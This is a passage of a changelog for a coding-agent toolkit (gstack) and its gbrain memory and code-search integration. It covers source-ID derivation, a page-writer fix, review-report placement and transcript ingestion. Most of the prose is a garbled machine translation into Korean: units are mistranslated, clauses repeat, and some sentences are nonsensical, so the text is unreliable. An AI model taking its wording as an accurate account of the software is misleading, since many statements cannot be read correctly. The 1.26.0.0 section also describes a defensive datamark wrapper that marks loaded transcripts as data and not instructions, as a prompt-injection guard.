| 가용성 probe 실패 형태 | `Unknown command: put_page`로 각 페이지 오류 | 1개의 청결한 과실: `gbrain CLI not in PATH or missing put subcommand` | 로그 스팸은 N 사본에서 1로 이동합니다. |
| 사용 가능한 `gbrainPutPage()` 타임아웃 | 30 s (자동 링크 재구성은 30 s의 dense 뇌에 기록) | 60 년대 | 수백 개의 기존 페이지가 들어있는 두뇌는 천장을 쳐 놓습니다. |
| `gbrainPutPage()` 오류 표면 | `Command failed:` (Node 1 MB stderr)를 truncates | `err.stderr`의 첫 300 숯 | 벌레잡기 정지 requiring strace; 실패는 눈에 보입니다 |

`gbrain put` 동사는 v0.18.2 이후 존재했으며 항상 오른쪽 CLI 표면이었습니다. `put_page` 모양은 CLI 경로로 새는 MCP 도구 이름이었습니다. 하이브리드 작가는 이제 두 개의 성적표 (`buildTranscriptPage`에서 frontmatter를 사용해서 title/type/tags를 그로 주사합니다) 및 원시 예술적인 페이지 (no frontmatter, 새로운 frontmatter로 감싸는)를 처리했습니다.

### 새로운 사용자를 위한 이 뜻

클린 설치에서 `/setup-gbrain`를 실행하고, 어떤 경로를 선택하고, 단계 7.5는 실제로 성적표와 메타데이터를 가진 뇌를 포용합니다. github-hosted repo에 `/sync-gbrain --full`를 실행하고 코드 단계는 `sources add` validator를 실패 대신 소스를 등록합니다. 헤드 라인 v1.26 기능은 마침내 그들이 할 것으로 배송 한 일을합니다.

### 항목화 된 변경

#### 고정
- `bin/gstack-memory-ingest.ts:gbrainPutPage` - CLI 표면 `gbrain put <slug>` (위치 slug, stdin, YAML frontmatter)의 메타데이터를 통해 stdin를 통해 내용으로 전환했습니다. 두 자리 잡은 하이브리드: 페이지 몸이 이미 frontmatter로 시작될 때 (`buildTranscriptPage`에서 문서 페이지를 시작하면, agent/session_id/cwd/git_remote/etc.를 미리 공개합니다. but no title/type/tags), inject title/type/tags into the existing block before the closing `---`. When the body has no frontmatter (raw artifact pages: design-docs, learnings, builder-profile-entries), wrap with a fresh frontmatter carrying the same fields. Either branch produces a page that gbrain's pages list, search, and tag filters actually surface. Contributed by @smithjoshua (PR #1328: base writer + 60 s timeout + 16 MB maxBuffer + stderr first-line surface) and the artifact-wrap branch added on top here.
- `bin/gstack-memory-ingest.ts:gbrainAvailable` — adds a `gbrain --help` probe with a regex anchored on the indented subcommand format (`/^\s+put\s/m`). Replaces the previous `command -v` only check. If a future gbrain renames or removes `put`, the writer fails fast with one clean error per ingest pass instead of N copies of `Unknown command: put_page`. Contributed by @AZ-1224 (PR #1341: probe origin); regex tightening added on top here per Codex P2 plan-review feedback.
- `bin/gstack-gbrain-sync.ts:deriveCodeSourceId` — drops the host segment from canonical remote URLs (the same `github.com-` prefix on every user's id was eating 12 chars of the 32-char gbrain budget for nothing) and falls back to a 6-char sha1 hash on the slug tail when org/repo names still exceed the limit. Every `github.com/<org>/<repo>` derives a gbrain-valid id on the first try. Contributed by @radubach (PR #1330).
- `bin/gstack-gbrain-sync.ts:constrainSourceId` - 빈 슬루그 가장자리 케이스를 처리 (모든 비 알루미늄 숯에 손상). Pre-fix 함수는 gbrain의 유효성 검사를 실패 `${prefix}-`는 기가 바이트를 반환합니다. 이제는 세분화적인 sha1-prefixed ID로 돌아갑니다. 새로운 `basename-sanitizes-to-empty` 회귀 시험을 통해 표면 처리 Codex 계획 검토 당이 버전에 추가했습니다.

#### 추가
- `test/gstack-memory-ingest.test.ts` - 두 회귀 테스트는 PATH에 가짜 `gbrain` shim를 서 있고 Claude Code 세션에 대하여 실제 `--bulk` ingest 파이프라인을 실행합니다. 처음에는 작가가 `gbrain put <slug>`(`put_page`)과 제목, 유형, AND 태그가 넣어진 stdin에 도착했습니다. 두 번째 점은 레거시 만 시엠의 작가와 `gbrain put <slug>`(`put_page`)의 오류가 발생했습니다. AND(AND)의 AND 태그가 아닌 AND의 오류가 발생했습니다. title/type/tags 에 도착하는 stdin 에 대한 assertions는 여기에서 최고에 추가됩니다. 강화 된 테스트는 PR #1328의 주사 branch에 있는 더 깊은 문제점을 표면으로 만들었습니다: 그것은 `\n---\n` (신선을 지나서)를 위해 찾아냈습니다 그러나 `buildTranscriptPage`는 새로운 선을 없이 frontmatter에, 그래서 검색 결코 일치하지 않습니다. 정상에 2 선 고침: `\n---`를 위한 검색.
- `test/gstack-gbrain-sync.test.ts` - PR #1330 (dot-host, SCP-style 리모트, 다 도트 호스트, 긴 org/repo forcing hash-truncate)와 두 개의 새로운 가장자리 케이스 이 버전 (no-origin fallback path; basename-sanitizes-to-empty). 각 테스트는 온도 git repo 내부 CLI를 향하고, ecretator가 유효하게 하도록 수정했습니다. @contributy gb.

#### 기여자
- Codex outside-voice plan review caught three P1 ship-blockers in the originally proposed merge (the no-frontmatter-wrap branch from PR #1341 alone would have silently dropped title/type/tags from every transcript page — its own tests passed because they only asserted `agent: claude-code`). The plan pivoted from `merge #1341 + cherry-pick from #1328` to `merge #1328 + hybrid writer + cherry-pick #1341's tests, strengthened`. 실제 gbrain (데이터베이스가 연결되는 곳)에 대한 두 패스 라이브 연기는 38 → 27 숯이됩니다. 메모리 - 가장 작가의 교정은 실제 `gbrain` CLI 프로세스에 대한 강화 된 shim 테스트에 의해 확인되었습니다.
- 두 개의 후속 TODOs 파일 : P2는 gstack 메모리 기능 릴리스 (물집 #1305 부분 2), P3를 사용하여 잠금 단계에 `bin/gstack-gbrain-install` 핀을 범퍼하는 `github.com/acme/foo` 및 `gitlab.com/acme/foo`는 현재 동일한 ID로 붕괴; 드물지만 침묵).

## [1.26.4.0] - 2026-05-05

## **`/autoplan` 리뷰는 이제 계획의 바닥에 의존하게 착륙합니다. 이전 사본이 중간 파일에 살고있을 때도.**

`## GSTACK REVIEW REPORT` 섹션은 그 자체를 금하는 글 규칙을 가지고 있었다: 한 개의 총알은 "전반적으로 (위로)"라고 말하면서 또 다른 말은 "마지막 섹션이 중간 파일이 이동하면." 에이전트가 이전에 `/autoplan` 실행이 사용자 추가 된 섹션 이전에 착륙 한 계획을 상속했을 때, 인- 대신 경로가 원하고 새로운 보고서가 중간 파일에 머물렀다. 사용자는 ExitPlanMode를 열었다, no와 계획을 보았습니다. 아래 두 번에 두 번에 두 번 요청해야 할. Single delete-then-append rule now, 다음 명령 실행 전에 Read-tool 검증 단계와 함께.

### 지금 할 수있는 일

- **이미 stale `## GSTACK REVIEW REPORT` 중형을 가지고 있는 플랜에 대하여 `/autoplan`를 실행하고 새로운 보고서가 바닥에 종료됩니다.** `scripts/resolvers/review.ts` (`/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/codex`, `/devex-review`)의 지시는 이제 1개의 규칙으로 읽습니다: 어떤 기존의 보고 단면도를 위해 찾아서, 그것을 생활하는 것을 삭제하십시오, 보고가 마지막 `##` 머리질하는 읽는 도구로, 증명하는 파일 끝에 신선한 보고를 추가하십시오. No 더 많은 피임약을 위한 에이전트을 재구성합니다.

## # 안전한 것 을 얻는 것

- **`test/gen-skill-docs.test.ts`의 5개의 정체되는 템플렛 assertions는 drift에 대하여 신속한 변화를 잠그.** 각 계획 - 리뷰 SKILL.md (4 중) 플러스 소스 결산자는 새로운 "delete-then-append flow"/ "never mid-file"/ "Do NOT가 장소의 섹션을 대체합니다"마크 AND가 오래된 "replace it**를 완전히 사용하여 편집 도구"/ "중 파일이 발견 된 경우 이동"알알을 사용합니다. 합성 회귀 검사 확인 : 모든 5는 모든 재갈 때 실패합니다. 다시 복원 할 때 5는 모든 수정이 실패합니다. 시험은 변화에 경계, 부패적으로 녹색 산출에 아닙니다.

### 항목화 된 변경

#### 변경
- `scripts/resolvers/review.ts` - "계획 파일에 쓰기" 섹션은 다시 작성합니다. 이전의 피임약 쌍 (" 완전히"중간 파일을 움직여"를 대 "알웨이가 지속 / 이동"을 의미)는 4 단계 삭제 된 한-부드 흐름을 명시적 검증으로 축소합니다.
- 모든 6 생성 된 SKILL.md 파일은 새로 지시를 수행하도록 새로 고침 : `plan-ceo-review`, `plan-design-review`, `plan-devex-review`, `plan-eng-review`, `codex`, `devex-review`.

#### 추가
- `test/gen-skill-docs.test.ts` — 새로운 `GSTACK REVIEW REPORT delete-then-append flow`는 구획을 설명합니다: 4 SKILL.md 표적 시험 + 1 근원 결심 시험. 정체되는, 세균성, 자유로운.

#### 기여자
- `/autoplan` E2E 계획에서 시도한 접근은 유료 실행 후에 떨어졌다는 것을 `--disallowedTools AskUserQuestion`는 계획 파일 fallback를 통해 단계 1 전제 문에 autoplan bail를 만듭니다. PTY 마구는 AskUserQuestions의 자동 보호 없이 그것의 검토 단계를 통해서 autoplan를 몰 수 없습니다. 정체되는 신속한 원본 시험은 그 인프라를 필요로 하지 않고 짐 방위 변화를 붙잡습니다.

## [1.26.3.0] - 2026-05-03

## **`/sync-gbrain` 뇌 전류를 유지하고 그것을 사용할 때 에이전트를 가르치십시오.**

두 가지 기능적 격차는 한 배로 닫힙니다: cwd repo는 실제로 gbrain (`gbrain import`라는 관현관이 아니라 마크다운 감독을 처리하고, 코드가 아닌), 코딩 에이전트가 no 아이디어 gbrain가 명시적으로 선택되지 않은 세션에 존재했습니다. 둘 다 gbrain v0.20.0+의 기본 코드 표면으로 전환하여 처리하고 CLAUDE.md 지도를 추가하여 게이트 게이트에서 작동을 확인하는 기능을 차단했습니다.

### 지금 할 수있는 일

- **`/sync-gbrain`를 실행하여 repo의 코드를 통해 gbrain을 새로 고침합니다.** Default는 `--incremental` (mtime fast-path, ~50ms)입니다. `--full`는 가득 차있는 re-index를 위한 `gbrain reindex-code`를 실행합니다. `--dry-run`는 어디에서나 쓰기 없이 동기화할 것입니까? `--code-only`, `--no-memory`, `--no-brain-sync`, `--quiet` 모든 일.
- **`gbrain code-def`/`code-refs`/`code-callers`/`code-callees`를 사용하여 repo에 대하여 사용하십시오.** /sync-gbrain는 `gbrain sources add` (idempotent — id는 `gstack-code-<repo_slug>`)를 통해 federated 근원으로 cwd를, 그 후에 `gbrain sync --strategy code` 실행합니다. 기본 코드 표면은 다만 일 후에 작동합니다.
- **모든 gstack 기술에 있는 gbrain hints를 미리 얻으십시오.** gbrain가 AND 을 구성할 때 cwd 소스에는 page_count > 0이 있습니다. 각 기술 시작은 4 라인 "prefer `gbrain search`/`code-def`/`code-refs` 을 그리스어로 변환합니다. 구성될 때, corpus는 비어있을 때, 당신은 3-line 비상 hint nudging를 얻게 됩니다. gbrain가 구성되지 않을 때, hint는 빈 문자열에 해결합니다 — 0 gbrain 사용자를 위해 비난합니다.
- **CLAUDE.md의 긴 형식지도를 찾습니다.** `/sync-gbrain` (과 `/setup-gbrain` 단계 8)는 `## GBrain Search Guidance` 구획에 의해, semantic 수색, 상징 인식 코드 조회 및 curated 기억 쿼리를 위한 구체적인 CLI 명령과 더불어 HTML 의견에 의해, 속합니다. 구획은 기능 체크가 실패할 때, 이렇게 맥을 제거됩니다 repo CLAUDE.md 그러나 no 국부적으로 gbraining's를 사용하지 않는 도구를 말하지 않습니다.

## # 안전한 것 을 얻는 것

- **동시 /sync-gbrain는 2개의 맨끝에서 실행하지 않습니다 CLAUDE.md 또는 `.gbrain-sync-state.json`를 손상하지 않습니다.** PID + 타임스탬프로 `~/.gstack/.sync-gbrain.lock`에서 파일을 잠그십시오. 5 분 후에 Stale-lock takeover. tmp+atomic-rename을 통해 쓴 두 파일. SIGINT/SIGTERM 함정은 자물쇠를 풀어 놓습니다.
- **`--dry-run` 실제로 어디에서 쓸 수 없습니다.** 이전의 오케스트라는 `gbrain import` 호출만 건너 뛰었다. 이제 `sources add`, `sync --strategy code`, state file, AND, CLAUDE.md 지도 블록을 건너 뛰고 있다. "would: ..." 줄을 각 작업에 대 한 출력을 인쇄 한다.
- **기능 체크는 `gbrain doctor` 보다는 더 좁습니다.** 의사는 다른 기능 뇌에 비등한 이유 (`resolver_health` 경고, `minions_migration` 부분 설치)를 위한 "비행성"를 출구합니다. /sync-gbrain는 실제로 우리가 걱정하는 것을 시험하는 write+search 둥근 지구 (`gbrain put $SLUG | gbrain search ping | grep $SLUG`)를 이용합니다: 에이전트 수색할 수 있습니다.

### 항목화 된 변경

#### 추가
- 새로운 `lib/gbrain-sources.ts` — `ensureSourceRegistered(id, path, options)` + `probeSource(id, env)` + `sourcePageCount(id, env)` 도움자. 생산 외침은 `env` unset (inherit `process.env`); 시험은 PATH에 가짜 `gbrain`에 점에 주문 env를 통과합니다.
- 새로운 `sync-gbrain/SKILL.md.tmpl` - 최고 수준의 기술, ~250 라인.
- 새로운 `test/gbrain-sources.test.ts` — PATH (jq 구동 국가 파일, no 진짜 DB 필요)에 가짜 GBrain 포탄 스크립트를 가진 9 단위 시험.
- 관현악의 Lock-file primitives (`acquireLock` / `releaseLock`).
- `.gbrain-sync-state.json`: `last_stages.code.detail = {source_id, source_path, page_count, last_imported, status}`의 새로운 코드 단계 세부사항 스키마.

#### 변경
- `bin/gstack-gbrain-sync.ts` `runCodeImport` `gbrain sources add` + `gbrain sync --strategy code` (incremental) 또는 `gbrain reindex-code --yes` (`--full`)를 `gbrain import` 대신 사용하는 재작용을 재작용합니다. 원자성을 위한 tmp+rename을 통해 쓴 국가 파일.
- `setup-gbrain/SKILL.md.tmpl` 단계 8 이제는 `## GBrain Configuration` AND `## GBrain Search Guidance` 구획, 단계 9 연기 시험 통행에 문질러 둘 다 쓰입니다.
- `scripts/resolvers/preamble/generate-brain-sync-block.ts`는 채식 A (4개의 선, 건강)/Variant B (3개의 선, 빈 corpus)/비어 있는 끈 (gbrain notconfig)를 방출합니다. 캐시된 cwd page_count를 주의하십시오 (`tr -d '\n'` flatten를 통해 꽤 + 콤팩트 JSON를 취급하십시오).
- `test/gen-skill-docs.test.ts` 플랜트-review preamble byte 예산이 33000 → 35000을 떨어뜨리고 새로운 컨텍스트 로드 블록을 흡수합니다.
- `test/gstack-gbrain-sync.test.ts` 기본 코드 표면 업데이트 (12 테스트, 8이었다) — 소스 ID 파생, 건조-런 no-lock, stale-lock takeover, 신선한 잠금 차단 추가.
- `test/skill-e2e-memory-pipeline.test.ts` `would: gbrain import` 대신 `would: gbrain sources add`로 업데이트되었습니다.
- 배 황금 정착물 (`test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md`) 새로 고침.

#### 기여자
- `package.json`와 `VERSION`의 4자리 `MAJOR.MINOR.PATCH.MICRO` 버전은 진실의 근원입니다.
- `bun run gen:skill-docs --host all`를 실행하여 `.tmpl`를 수정한 후 SKILL.md 파일을 재생합니다. commit는 둘 다.
- gbrain v0.25.1 이미 `gbrain sync --watch [--interval N]`와 `gbrain sync --install-cron`를 기본적으로 발송합니다. 이전에 V1.5 P0 daemon는 그 대신에 그루터기 측 시계를 건설하는 것을 통해 철사 할 수 있습니다.

## [1.26.2.0] - 2026-05-03

## **`/plan-eng-review` 항상 물어. 절대로 침묵으로 당신의 계획에 대한 발견을 처음 쓰고.**

Plan-mode review skills now have hard STOP gate before any AskUserQuestion. 버그 this closes: a `/plan-eng-review` session will do Step 0 range Challenge, find real issues, 쓰기 the find a plan file as prose, then call `ExitPlanMode` — never invoking AskUserQuestion. 사용자는 이미 구운 모델의 의견과 함께 "ready to perform"를 보았다. 표면 질문에 대한 도구는 여전히 모델의 사용 경로에 대해 설명했다.

`plan-eng-review/SKILL.md.tmpl`의 다섯 사이트가 이제 사무실 시간 `b512be71` 패턴 동사각형을 사용합니다. "AskUserQuestion 호출은 도구_use이며, prose가 아닌 도구입니다. "blockers라는 도구로 직접 호출하십시오. ("계획 파일을 편집하지 않고, ExitPlanMode를 호출하지 마십시오) 및 도구 검색을 통해 스키마를로드하고 채팅 프로세스가 실패 모드로 권고를 작성하십시오. 이 게이트는 예방할 수 있습니다. 4개의 검토 단면도 문 (Architecture, 코드 질, 시험, 성과) 및 단계 0개의 복잡성 체크 방아쇠는 모두 동일한 언어를 사용합니다.

### 지금 할 수있는 일

- ** 플랜트 파일이 검토 보고서로 끝나는 모든 계획 * 검토 기술. ** 모든 4 계획 모드 E2E 테스트 (`plan-eng`, `plan-ceo`, `plan-design`, `plan-devex`) 이제 assert `## GSTACK REVIEW REPORT`는 마지막으로 `## ` 계획 파일의 섹션이 작성된 경우. `{{PLAN_FILE_REVIEW_REPORT}}` 해결자가 계약에 영향을 미쳤다. 지금까지 테스트하지 않은 것은 없습니다.
- **"쓰기" 오류 모드를 묻는 전에 prose로 계획하는 것을 씁니다.** `Write`/`Edit`가 `.claude/plans/*`가 세션 창에서 렌더링하는 AskUserQuestion가 AskUserQuestion가 되기 전에 `strictPlanWrites: true`가 `strictPlanWrites: true`를 통해 `strictPlanWrites: true`를 통해, 영-금융 → 쓰기 계획 → plan_ready가 합법적으로 유지되는 기존의 테스트를 합니다.
- **Run `plan-design-review-plan-mode` on PR CI again.** 터치파일 항목은 복제되었다 — `plan-design-review-plan-mode` 라인 94 (게이트, 풀 데프) 및 라인 243 (스마일러 드ps)에 출연. JS 오브젝트 리터럴: 나중에 승리. 효과적인 계층은 `periodic`, 아니 `gate`. 4 계획 모드 siblings ran의 세 각 PR; 디자인이 아니었다.

### 항목화 된 변경

#### 추가

- `runPlanSkillObservation`의 `initialPlanContent?: string` 옵션. 3s 간격으로 기술을 통합하기 전에 시드 플랜을 포함하는 사용자 메시지가 슬래시 명령 앞에 렌더링됩니다.
- `ClassifyResult`는 `classifyVisible`를 동반한 `wrote_findings_before_asking`를 `classifyVisible`에 옵트로 `claude-pty-runner.unit.test.ts` 덮개에 있는 6개의 새로운 단위 시험 /after-AUQ 순서로 그리고 엄격한 떨어져 유산 경로.
- `claude-pty-runner.ts`의 공유 테스트 돕기 `assertReportAtBottomIfPlanWritten(obs)`. `assertReviewReportAtBottom(content)`와 `obs.planFile` (현재)에 있는 문, 그래서 `'asked'`와 `'plan_ready'` 둘 다의 밑에 assertion 불 - 계획 파일이 실제로 기록된 곳.
- `skill-e2e-plan-eng-plan-mode.test.ts`: `STOP gate fires when seeded plan forces Step 0 findings`에 있는 새로운 종종 계획 시험 케이스. `initialPlanContent` + `--disallowedTools AskUserQuestion`를 MCP-variant path를 통해서 강제하기 위하여 결합하십시오 `mcp__*__AskUserQuestion`.

#### 변경

- `plan-eng-review/SKILL.md.tmpl` 선 116, 139, 152, 160, 169은 부드러운 "STOP"로 향했습니다. 사무실 시간 패턴에 prose. tool_use 알림을 추가하고, 다음 단계를 명시적으로 차단 한 이름, anti-rationalization 항목.
- `runPlanSkillObservation` 이제 `obs.planFile`를 각 클래스의 정수기 (와: `'plan_ready'`)에 캡처합니다. 기술이 문제를 일시적으로 일시적으로 계획한 경우를 캐치합니다.

#### 고정

- `test/helpers/touchfiles.ts` 중복 `plan-design-review-plan-mode` 키 삭제 (`E2E_TOUCHFILES`, `E2E_TIERS`에서 524호선). 효과적인 계층은 이제 `gate`, 다른 세 개의 주사와 일치하는.
- `scripts/resolvers/review.ts` 4개의 계획 형태 시험 접촉표 항목에 추가해 `{{PLAN_FILE_REVIEW_REPORT}}` 결의자 텍스트 트리거에 `bun run eval:select`에 있는 모든 4개의 주사 시험이 바뀝니다.

#### 기여자

- `test/helpers/claude-pty-runner.unit.test.ts` (70 → 76)에 있는 6개의 새로운 분류하는 장치 단위 시험.
- 새로운 `initialPlanContent?: string` 옵션 `runPlanSkillObservation`는 초안 계획을 기술로 부동하기 전에 테스트 실행을 시킴으로써 계산합니다. STOP-gate 회귀 시험은 사전 펌프 보장 핀딩 트리거를 제거하는 복잡성 (8 + 파일, 사용자 정의 vs-builtin 냄새)을하자 그래서 기술에는 반응하는 무언가 콘크리트가 있습니다.

## [1.26.1.0] - 2026-05-03

## **`gstack-gbrain-sync`는 호스트가 배를 내립니다. Claude Code, Codex CLI, 또는 dev workspace — 동일한 관현관자, 동일한 설치, 동일한 결과를 push에서 push를 치료했습니다.**

관현관은 `runMemoryIngest`에서 이미 본을 일치한 `gstack-brain-sync` 이진을 `import.meta.dir`로 칭한다. 경로 해상도는 실제로 살아 있는 곳에 고정되어 있어, 하드코드 호스트가 루트를 설치하지 않도록, 큐레이터-픽스 스테이지는 각 호스트 gstack 지원에 종료됩니다.

### 지금 할 수있는 일

- **`gstack-gbrain-sync`를 호스트 설치에서 실행하고 원격의 curated artifacts 토지를 볼 수 있습니다.** 지휘자 작업 공간에서 종료 연기: `bun run bin/gstack-gbrain-sync.ts --incremental --no-code --no-memory --quiet` 반환 `{"name": "brain-sync", "ran": true, "ok": true, "summary": "curated artifacts pushed"}`. 단계는 Codex CLI 설치 및 dev 체크 아웃에 동일한 방식으로 실행 Claude 코드.

### 변경

- `runBrainSyncPush` (`bin/gstack-gbrain-sync.ts:222`)는 실행 스크립트의 sibling으로 curated-push 바이너리를 해결합니다. 한 줄, 진실의 단일 소스 : `join(import.meta.dir, "gstack-brain-sync")`.

### 기여자

- `test/gstack-gbrain-sync.test.ts` 핀에 새로운 회귀 테스트는 sibling-resolution 행동을 초래하여 미래의 재발견을 호스트로 다시 오케스트라를 무방하게 할 수 없습니다.
- `plan-review`는 33 KB에서 34 KB에 범람된 바이트 래치드를 전당하게 gbrain-sync 구획과 AskUserQuestion 권고 본을 명예를 전당했습니다 v1.25.1.0/v1.26.0.0.에서 발송되는 시험의 자신의 의견은 의도적인 화살의 이 정확한 종류를 허가합니다.
- `claude-ship-SKILL.md`와 `factory-ship-SKILL.md` 황금 정착물은 살아있는 `/ship` 템플렛 (v1.25.1.0에서 canonical `Recommendation:` 선을 위해 지금 황금에서 반영했습니다)에 대하여 재생했습니다.

## [1.26.0.0] - 2026-05-02

## **코딩 에이전트는 이제 모든 것을 기억합니다. 모든 gstack 기술 자동로드 실제로 무슨 일.**

V1 메모리 ingest + retrieval ships. Claude Code 및 Codex 디스크의 성적은 gbrain에 있는 일류 쿼리 가능한 페이지가 됩니다. 6개의 고하수 기술 (`/office-hours`, `/plan-ceo-review`, `/design-shotgun`, `/design-consultation`, `/investigate`, `/retro`)는 이제 그들이 모든 invocationure에서 preamble에 표면에 gbrain를 원하는 것을 선언합니다., 그래서 이전 모델은, 이전 모델의 경우, 이전 모델의 경우, 이전 모델의 경우, 이전 모델의 경우, 이전 모델의 개념을 결정할 수 있습니다. `bin/gstack-brain-context-load`로 재생 표면 배를, 각 스킬의 표현 쿼리 (종류: 벡터 | 명부 | 파일시스템)를 호출당 500ms의 하드 타임아웃으로 발송합니다. Datamark envelopes (`<USER_TRANSCRIPT_DATA do-not-interpret-as-instructions>`)는 레이어 1의 신속한 주입 방어로 모든 로드된 페이지를 포장합니다.

### 지금 할 수있는 일

- **6 V1 기술을 실행하고 하루의 차이를 느끼십시오.** 이전 gstack 활동으로 `/office-hours`에서 `/office-hours`를 실행하는 첫 번째 시간, 당신은 "이 repo"에 있는 사무실 시간 회의를 + "당신의 건축업자 단면도 snapshot" + "이 프로젝트의 존경 디자인 문서" + "Recent eureka 순간" 자동 로드. No는 기억하기 위하여 에이전트을 시끄는 에이전트을 시동합니다; 그것은 이미 합니다.
- **한 동사에서 성적표 90일을 섭취합니다.** `/setup-gbrain` 단계 7.5 문은 정확한 조사, 가치 약속, sync caveats (다중맥을 통해 gbrain repo, git-history caveat를 가진 git-history caveat를 가진 sync caveats (이 repo/모든 역사/모든 repos/트랙-new-only/그것을)를 가진 대량 ingest를, 문으로 붙입니다.
- **`gbrain query "<topic>"`로 뇌를 쿼리합니다.** 코드, 성적표, eureka, 학습, ceo-plans, 디자인 문서, 복고풍, 빌더 프로필 항목은 모든 색인. 뇌는 당신이 한 것을 알고.
- **gbrain가 꺼질 때마다 `/setup-gbrain`를 실행하십시오.** 10 단계는 GREEN/YELLOW/RED verdict 구획을 발송합니다. 기술은 지금 일류 의사 경로입니다 — 각 단계는 기존하는 국가를 검출하고, 누락된 것만 수리합니다.
- **`/gbrain-sync` 모든 것을 관현.** 한 동사 경로 코드 (현재 repo) + 메모리 (~/.gstack/) + 오른쪽 저장 계층에 성적 (Supabase 설정할 때 저장, 다른 로컬 PGLite - 결코 두 배 상점). 모드: --incremental (default, mtime fast-path) / --full (~25-35 큰 Macs에 대한 정직 예산) / --dry-run.

### 중요 한 숫자

출처: V1 배 + V1 테스트 스위트 (`bun test test/gstack-memory-*.test.ts test/skill-e2e-memory-pipeline.test.ts`) 후 `git diff --shortstat origin/main..HEAD`.

| Metric | Δ |
|---|---|
| Net branch 크기 대 주 | **+4174 / −849 라인** 39개의 파일들 |
| 새로운 공유 라이브러리 | **`lib/gstack-memory-helpers.ts`** (330 LOC, 5 public 기능: canonicalizeRemote, secretScanFile, detectEngineTier, parseSkillManifest, withErrorContext) |
| `bin/`의 새로운 연구원 | **3명의 도움자** — `gstack-memory-ingest` (580 LOC), `gstack-gbrain-sync` (270 LOC), `gstack-brain-context-load` (420 LOC) |
| V1 gbrain와 기술이 나타났습니다. | **6 기술** — `/office-hours`, `/plan-ceo-review`, `/design-shotgun`, `/design-consultation`, `/investigate`, `/retro` |
| 메모리 유형 ingested | **8가지 유형** - 성적표 (Claude Code + Codex), eureka, 학습, 타임라인, ceo-plan, 디자인 문서, 복고풍, 빌더 프로필 엔트리 |
| 시험 추가 | **65 새로운 테스트** — 22명의 돕ers + 15 ingest + 8개의 sync + 10의 컨텍스트 로드 + 10 E2E 파이프라인 |
| 새로운 /setup-gbrain 단계 | **2 단계** — 단계 7.5 (5option AskUserQuestion) + 단계 10 (GREEN/YELLOW/RED idempotent 의사 verdict)를 가진 성적 간호 문 |
| 새로운 사용자 계획 참조 | **`setup-gbrain/memory.md`** — 무슨 일이 ingested, gitleaks를 통해 지방, 비밀 검사, 쿼리, 삭제, 복구 케이스 |
| 망설임 스키마 | **`gbrain.schema: 1`**, gen-skill-docs time에 유효성 검사; 3개의 질의 종류 (vector/list/filesystem)를 종류별 필수 필드로 분류 |
| MCP- 쿼리당 시간 상환 | **500ms의** 하드캡; preamble 결코 막지 마십시오 > gbrain 문제에 2s |
| Datamark 봉투 랩 | **의논하기** (메시지 않음) - 렌더링 된 몸의 단일 봉투 |

### 이 빌더를 위한 뜻

에이전트에 대한 과거 작업을 설명하는 중지. 에이전트는 이미 알고. 실행 `/office-hours` 과 "환영 다시, X에 있었다 마지막 시간" 비트는 데이터에서 소스. 실행 `/investigate` 과 함께 열다 "우리는이 버그 클래스를 타격 전에?" 대신 감기 시작. 실행 `/design-shotgun` 과 변형은 당신의 취향에서 재생, 일반 기본.

V1: curated Memory rides the 기존의 Brain-sync git 파이프라인; 구성 (멀티맥 네이티브) 또는 PGLite-only Macs에 로컬을 유지할 때 Supabase 저장 경로 및 성적 경로. **두 배 상점.** 결정 규칙 default (default)에서 CEO 검토 및 Codex 외부 청구 도전: 루프 값 (최대 → 다중 결정).

V1는 CEO D18 (Codex F10 전략적인 도전) 당 **골드 락** 범위입니다: 가치 반복은 일 하나에 닫힙니다. V1.5 P0 후속 캡처: `/gbrain-sync --watch` daemon (F3 invariant 당 철거), `mcp__gbrain__code_search` MCP 도구 (`cross-repo coordination, gb) default` one-line manifest opt-in (per F1 frontmatter passthrough is bigger than estimated), agent-agnostic `gbrain context` CLI, 뇌-trajectory Observability + 주간 digest, classifier 기반 신속한 주입 방어 (F5 ONNX 통합), salience MCP 서버 측 촉진. 계획의 V1.5 TODOs에서 모든 문서화.

### 항목화 된 변경

#### 추가 — 재단

- `lib/gstack-memory-helpers.ts` - 모든 V1 돕기로 수입된 공유 단위. canonicalizeRemote (handles https/ssh/git@/.git/quotes/multi-segment), secretScanFile (디지털화된 `scanner: "gitleaks" | "missing" | "error"` 반환을 가진 gitleaks 래퍼), detectEngineTier (캐스케이드 60s), parseSkillManifest, withErrorContext (async-aware 오류 로깅 `~/.gstack/.gbrain-errors.jsonl`).

#### 추가 — Ingest 파이프라인

- `bin/gstack-memory-ingest` — walks `~/.claude/projects/*/`, `~/.codex/sessions/YYYY/MM/DD/`, and `~/.gstack/` artifacts (eureka, learnings, timeline, ceo-plans, design-docs, retros, builder-profile). Modes: --probe / --incremental (default, mtime fast-path) / --bulk. Tolerant JSONL parser handles truncated last lines (D10 partial-flag). State at `~/.gstack/.transcript-ingest-state.json` with schema_버전: 1, 백업에 - 악성 코드 + JSON-corrupt 복구. gitleaks는 모든 페이지에 넣어 전에 실행_page (D19). --시험용 플래그 + 건식(`GSTACK_MEMORY_INGEST_NO_WRITE=1`)
- `bin/gstack-gbrain-sync` - 통합 동기화 동사. 오케스트라트 3 단계 : 코드 가져 오기 → 메모리 ingest → curated git push. 모드 : --incremental / --full / --dry-run. per-stage outcomes와 ED1 (LOCAL)의 상태. --code-only / --no-code / --no-memory / --no-brain-sync for disable stage.

#### 추가 — Retrieval 표면

- `bin/gstack-brain-context-load` — V1 retrieval surface. Dispatches per-skill manifest queries by kind (vector via `gbrain query`, list via `gbrain list_pages`, filesystem via local glob). 500ms hard timeout per MCP call. Datamark envelope per page. Layer 1 default fallback with 3 sections (recent transcripts + recent curated + skill-name-matched timeline) all carrying explicit `repo: {repo_slug}` filter (F7 cleanup). Template var substitution: {repo_스크랩_slug}, {branch}, {skill_name}, {window}.

#### 추가 — 기술이 나타난다 (6 V1 기술)

- `office-hours/SKILL.md.tmpl` — 4개의 쿼리 (prior-session list + 빌더프로필 fs + 디자인 문서-history fs + 사전 eureka fs)
- `plan-ceo-review/SKILL.md.tmpl` - 3개의 쿼리 (프리오 세토 플랜 fs + 최근 디자인 문서 fs + 최근 리뷰 목록)
- `design-shotgun/SKILL.md.tmpl` - 3개의 쿼리 (prior-approved-variants fs + DESIGN.md fs + 최근 디자인 문서 fs)
- `design-consultation/SKILL.md.tmpl` — 3개의 쿼리 (existing-DESIGN.md fs + 사전 설계 절정 fs + 브랜드 가이드 라인 목록)
- `investigate/SKILL.md.tmpl` — 3 쿼리 (프리오 - 인베레스트리스트 + 프로젝트 - 레닝스 fs + 최근 에레카 fs)
